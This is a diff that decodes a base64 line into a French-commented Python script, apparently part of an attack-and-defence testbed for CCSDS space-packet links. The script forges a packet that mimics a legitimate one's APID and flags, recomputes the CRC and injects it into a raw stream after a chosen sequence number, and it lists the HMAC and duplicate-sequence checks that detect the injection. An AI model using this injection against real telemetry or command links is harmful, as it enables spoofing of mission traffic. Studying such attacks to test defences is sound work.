@@ -1,1 +1,78 @@
-IyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgaW5qZWN0X3BhY2tldC5weSDigJMgQXR0YXF1ZSAyIC8gVmVjdGV1ciA1IDogSW5qZWN0aW9uIGRlIHBhcXVldAojCiMgSW5zw6hyZSB1biBwYXF1ZXQgQ0NTRFMgZW50acOocmVtZW50IGZvcmfDqSBkYW5zIGxlIGZsdXggYXByw6hzCiMgdW4gcGFxdWV0IGNpYmzDqS4gTGUgQ1JDIGVzdCBjYWxjdWzDqSBzdXIgbGEgdHJhbWUgZm9yZ8OpZS4KIyBTYW5zIEhNQUMsIGxlIHLDqWNlcHRldXIgYWNjZXB0ZSBsZSBwYXF1ZXQgaW5qZWN0w6kgY29tbWUgbMOpZ2l0aW1lLgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCmltcG9ydCBzeXMKaW1wb3J0IG9zCgpzeXMucGF0aC5pbnNlcnQoMCwgb3MucGF0aC5qb2luKG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXyksICIuLiIsICIuLiIpKQpmcm9tIHNyYy5yZWNlaXZlci5mcmFtZVBhcnNlciBpbXBvcnQgcGFyc2VTdHJlYW0KZnJvbSBzcmMuYXR0YWNrcy5fdXRpbHMgaW1wb3J0IHJlYnVpbGRQYWNrZXQKCgpkZWYgaW5qZWN0UGFja2V0KAogICAgcmF3U3RyZWFtOiBieXRlcywKICAgIGZha2VQYXlsb2FkOiBieXRlcywKICAgIGZha2VTZXE6IGludCwKICAgIGluc2VydEFmdGVyU2VxOiBpbnQsCiAgICB2ZXJib3NlOiBib29sID0gVHJ1ZSwKKSAtPiBieXRlczoKICAgICIiIgogICAgSW5zw6hyZSB1biBwYXF1ZXQgZm9yZ8OpIGRhbnMgbGUgZmx1eCBhcHLDqHMgdW4gbnVtw6lybyBkZSBzw6lxdWVuY2UgZG9ubsOpLgoKICAgIExlIHBhcXVldCBpbmplY3TDqSByZXByZW5kIGwnQVBJRCBldCBsZXMgZmxhZ3MgZHUgcHJlbWllciBwYXF1ZXQgbMOpZ2l0aW1lCiAgICBwb3VyIHBhcmHDrnRyZSBjcsOpZGlibGUuIFNvbiBzZXFDb3VudCBlc3QgY2hvaXNpIHBhciBsJ2F0dGFxdWFudC4KCiAgICBBcmdzOgogICAgICAgIHJhd1N0cmVhbTogICAgICBGbHV4IGRlIHBhcXVldHMgQ0NTRFMgYnJ1dHMuCiAgICAgICAgZmFrZVBheWxvYWQ6ICAgIFBheWxvYWQgZHUgcGFxdWV0IGluamVjdMOpLgogICAgICAgIGZha2VTZXE6ICAgICAgICBzZXFDb3VudCBhdHRyaWJ1w6kgYXUgcGFxdWV0IGluamVjdMOpLgogICAgICAgIGluc2VydEFmdGVyU2VxOiBzZXFDb3VudCBhcHLDqHMgbGVxdWVsIGluc8OpcmVyIGxlIGZhdXggcGFxdWV0LgogICAgICAgIHZlcmJvc2U6ICAgICAgICBBZmZpY2hlciB1biBsb2cgZGUgbCdpbmplY3Rpb24uCgogICAgUmV0dXJuczoKICAgICAgICBGbHV4IG1vZGlmacOpIGF2ZWMgbGUgcGFxdWV0IGZvcmfDqSBpbnPDqXLDqS4KCiAgICBEw6l0ZWN0aW9uIChEw6lmZW5zZSAyKSA6CiAgICAgICAg4oaSIEhNQUNfRkFJTCAgICAgIDogc2kgZmFrZVNlcSBlc3QgZMOpasOgIGRhbnMgbGUgdGFnIG1hcAogICAgICAgIOKGkiBITUFDX1VOS05PV04gICA6IHNpIGZha2VTZXEgZXN0IGluY29ubnUgZHUgdGFnIG1hcAogICAgICAgIOKGkiBEVVBMSUNBVEVfU0VRICA6IHNpIGZha2VTZXEgZHVwbGlxdWUgdW4gc2VxQ291bnQgZXhpc3RhbnQKICAgICIiIgogICAgcGFja2V0cyA9IHBhcnNlU3RyZWFtKHJhd1N0cmVhbSkKCiAgICAjIFLDqWbDqXJlbmNlIHBvdXIgbGVzIGNoYW1wcyBjb25zdGFudHMgKEFQSUQsIGZsYWdzLCB2ZXJzaW9u4oCmKQogICAgcmVmID0gcGFja2V0c1swXSBpZiBwYWNrZXRzIGVsc2UgewogICAgICAgICJhcGlkIjogMSwgInNlcUZsYWdzIjogMywKICAgICAgICAidmVyc2lvbiI6IDAsICJwYWNrZXRUeXBlIjogMCwgInNlY0hkckZsYWciOiAwLAogICAgfQoKICAgIGZha2VQa3QgPSByZWJ1aWxkUGFja2V0KAogICAgICAgIGFwaWQgICAgICAgPSByZWZbImFwaWQiXSwKICAgICAgICBzZXFGbGFncyAgID0gcmVmWyJzZXFGbGFncyJdLAogICAgICAgIHNlcUNvdW50ICAgPSBmYWtlU2VxLAogICAgICAgIHZlcnNpb24gICAgPSByZWZbInZlcnNpb24iXSwKICAgICAgICBwYWNrZXRUeXBlID0gcmVmWyJwYWNrZXRUeXBlIl0sCiAgICAgICAgc2VjSGRyRmxhZyA9IHJlZlsic2VjSGRyRmxhZyJdLAogICAgICAgIHBheWxvYWQgICAgPSBmYWtlUGF5bG9hZCwKICAgICkKCiAgICAjIFRyb3V2ZXIgbCdvZmZzZXQgZCdpbnNlcnRpb24gKGFwcsOocyBsZSBwYXF1ZXQgY2libGUpCiAgICBpbnNlcnRPZmZzZXQgPSAwCiAgICBmb3IgcGt0IGluIHBhY2tldHM6CiAgICAgICAgaW5zZXJ0T2Zmc2V0ICs9IHBrdFsidG90YWxTaXplIl0KICAgICAgICBpZiBwa3RbInNlcUNvdW50Il0gPT0gaW5zZXJ0QWZ0ZXJTZXE6CiAgICAgICAgICAgIGJyZWFrCgogICAgcmVzdWx0ID0gcmF3U3RyZWFtWzppbnNlcnRPZmZzZXRdICsgZmFrZVBrdCArIHJhd1N0cmVhbVtpbnNlcnRPZmZzZXQ6XQoKICAgIGlmIHZlcmJvc2U6CiAgICAgICAgcHJpbnQoCiAgICAgICAgICAgIGYiW0EyL2luamVjdFBhY2tldF0gUGFxdWV0IGZvcmfDqSBzZXFDb3VudD17ZmFrZVNlcX0gIgogICAgICAgICAgICBmImluc8OpcsOpIGFwcsOocyBzZXFDb3VudD17aW5zZXJ0QWZ0ZXJTZXF9ICAoe2xlbihmYWtlUGt0KX0gb2N0ZXRzKSIKICAgICAgICApCgogICAgcmV0dXJuIHJlc3VsdAo=
+# =============================================================
+# inject_packet.py – Attaque 2 / Vecteur 5 : Injection de paquet
+#
+# Insère un paquet CCSDS entièrement forgé dans le flux après
+# un paquet ciblé. Le CRC est calculé sur la trame forgée.
+# Sans HMAC, le récepteur accepte le paquet injecté comme légitime.
+# =============================================================
+
+import sys
+import os
+
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
+from src.receiver.frame_parser import parse_stream
+from src.attacks._utils import rebuildPacket
+
+
+def injectPacket(
+    rawStream: bytes,
+    fakePayload: bytes,
+    fakeSeq: int,
+    insertAfterSeq: int,
+    verbose: bool = True,
+) -> bytes:
+    """
+    Insère un paquet forgé dans le flux après un numéro de séquence donné.
+
+    Le paquet injecté reprend l'APID et les flags du premier paquet légitime
+    pour paraître crédible. Son seqCount est choisi par l'attaquant.
+
+    Args:
+        rawStream:      Flux de paquets CCSDS bruts.
+        fakePayload:    Payload du paquet injecté.
+        fakeSeq:        seqCount attribué au paquet injecté.
+        insertAfterSeq: seqCount après lequel insérer le faux paquet.
+        verbose:        Afficher un log de l'injection.
+
+    Returns:
+        Flux modifié avec le paquet forgé inséré.
+
+    Détection (Défense 2) :
+        → HMAC_FAIL      : si fakeSeq est déjà dans le tag map
+        → HMAC_UNKNOWN   : si fakeSeq est inconnu du tag map
+        → DUPLICATE_SEQ  : si fakeSeq duplique un seqCount existant
+    """
+    packets = parse_stream(rawStream)
+
+    # Référence pour les champs constants (APID, flags, version…)
+    ref = packets[0] if packets else {
+        "apid": 1, "seqFlags": 3,
+        "version": 0, "packetType": 0, "secHdrFlag": 0,
+    }
+
+    fakePkt = rebuildPacket(
+        apid       = ref["apid"],
+        seqFlags   = ref["seqFlags"],
+        seqCount   = fakeSeq,
+        version    = ref["version"],
+        packetType = ref["packetType"],
+        secHdrFlag = ref["secHdrFlag"],
+        payload    = fakePayload,
+    )
+
+    # Trouver l'offset d'insertion (après le paquet cible)
+    insertOffset = 0
+    for pkt in packets:
+        insertOffset += pkt["totalSize"]
+        if pkt["seqCount"] == insertAfterSeq:
+            break
+
+    result = rawStream[:insertOffset] + fakePkt + rawStream[insertOffset:]
+
+    if verbose:
+        print(
+            f"[A2/injectPacket] Paquet forgé seqCount={fakeSeq} "
+            f"inséré après seqCount={insertAfterSeq}  ({len(fakePkt)} octets)"
+        )
+
+    return result
